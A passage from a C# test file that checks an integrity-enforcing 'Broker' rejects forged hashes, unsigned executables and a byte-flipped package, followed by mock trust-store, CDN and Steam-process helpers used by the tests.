        // 3. 本地 .zip.vz 遭投毒篡改导致与 manifest sha2vz 不一致时，Broker 必须拒绝
        byte[] poisonedVz = uiVz.ToArray();
        poisonedVz[^1] ^= 0xFF;
        await File.WriteAllBytesAsync(Path.Combine(pkgDir, uiVzName), poisonedVz);

        bool poisonedVzRejected = await ThrowsBrokerConfigDeniedAsync(() =>
            BrokerEngine.RepairSteamPackageRestoreFileAsync(
                spAction,
                layout,
                Path.Combine(backupDir, "poisoned.original"),
                (_, _) => Task.CompletedTask,
                _ => { },
                CancellationToken.None));

        Check("Broker 零信任拦截客户端篡改目标哈希、未签名提取 PE 及遭投毒本地分包且未改写目标文件",
            forgedHashRejected &&
            unsignedExtractedExeRejected &&
            poisonedVzRejected &&
            (await File.ReadAllBytesAsync(spPath)).SequenceEqual(tamperedSp) &&
            (await File.ReadAllBytesAsync(exePath)).SequenceEqual(tamperedExe));
    }

    private static async Task<bool> ThrowsBrokerConfigDeniedAsync(Func<Task> action)
    {
        try
        {
            await action().ConfigureAwait(false);
            return false;
        }
        catch (Exception ex) when (ex is InvalidOperationException or InvalidDataException)
        {
            return true;
        }
    }

    private sealed class RecoveryMockCdnHandler(Func<HttpRequestMessage, HttpResponseMessage> responder) : HttpMessageHandler
    {
        protected override Task<HttpResponseMessage> SendAsync(HttpRequestMessage request, CancellationToken cancellationToken) =>
            Task.FromResult(responder(request));
    }

    private sealed class RecoveryMemoryTrustStore : IIncidentTrustStore
    {
        private readonly Dictionary<Guid, IncidentTrustRecord> _records = [];

        public void RegisterPending(QuarantineManifest manifest, string pendingManifestSha256) =>
            _records[manifest.IncidentId] = new IncidentTrustRecord(
                manifest.IncidentId,
                manifest.PlanId,
                manifest.TrustId,
                manifest.RequestedBySid,
                manifest.CreatedAtUtc,
                string.Empty,
                pendingManifestSha256);

        public IncidentTrustRecord GetRequired(Guid incidentId) =>
            _records.TryGetValue(incidentId, out IncidentTrustRecord? value)
                ? value
                : throw new UnauthorizedAccessException("test trust store missing record");

        public void BeginManifestUpdate(Guid incidentId, string nextManifestSha256)
        {
            IncidentTrustRecord current = GetRequired(incidentId);
            _records[incidentId] = current with { PendingManifestSha256 = nextManifestSha256 };
        }

        public void CommitManifestUpdate(Guid incidentId, string manifestSha256)
        {
            IncidentTrustRecord current = GetRequired(incidentId);
            if (!current.AcceptsManifestHash(manifestSha256))
                throw new InvalidOperationException("test trust store hash mismatch");
            _records[incidentId] = current with { ManifestSha256 = manifestSha256, PendingManifestSha256 = null };
        }

        public void Delete(Guid incidentId) => _records.Remove(incidentId);
    }

    private sealed class RecoveryFixtureStateSecurity : IIncidentStateSecurity
    {
        public void EnsureProtectedPath(string path) { }
        public void EnsureProtectedSubtree(string path) { }
    }

    private sealed class RecoveryMockSteamProcessEnvironment : ISteamProcessEnvironment
    {
        public List<SteamProcessCandidate> RunningProcesses { get; } = [];
        public List<string> ShutdownCalls { get; } = [];
        public List<(int Pid, string ExecutablePath)> TerminateCalls { get; } = [];
        public Func<string, bool>? ShutdownAction { get; set; }
        public Func<string, SignatureResult>? VerifyFunc { get; set; }
        public int PollsRemainingBeforeExit { get; set; }

        public IReadOnlyList<SteamProcessCandidate> ListCandidateProcesses()
        {
            if (PollsRemainingBeforeExit > 0)
            {
                PollsRemainingBeforeExit--;
                if (PollsRemainingBeforeExit == 0)
                {
                    HashSet<int> triggeredPids = RunningProcesses
                        .Where(p => ShutdownCalls.Any(call =>
                            Path.GetDirectoryName(call) is { } root &&
                            ContentDiscovery.IsWithin(p.ImagePath ?? string.Empty, root)))
                        .Select(p => p.Pid)
                        .ToHashSet();
                    RunningProcesses.RemoveAll(p => triggeredPids.Contains(p.Pid));
                }
            }

            return RunningProcesses.ToArray();
        }

        public SignatureResult VerifyExecutable(string path) =>
            VerifyFunc is not null
                ? VerifyFunc(path)
                : new SignatureResult(SignatureStatus.Unsigned, "unmocked");

        public bool StartShutdown(string steamExePath)
        {
            ShutdownCalls.Add(steamExePath);
            return ShutdownAction?.Invoke(steamExePath) ?? true;
        }

        public bool TerminateProcess(int pid, string expectedImagePath)
        {
            TerminateCalls.Add((pid, expectedImagePath));
            return RunningProcesses.RemoveAll(p => p.Pid == pid) > 0;
        }

        public Task DelayAsync(TimeSpan delay, CancellationToken cancellationToken)
        {
            cancellationToken.ThrowIfCancellationRequested();
            return Task.CompletedTask;
        }

        public void ResetCalls()
        {
            ShutdownCalls.Clear();
            TerminateCalls.Clear();
            PollsRemainingBeforeExit = 0;
        }
    }
}
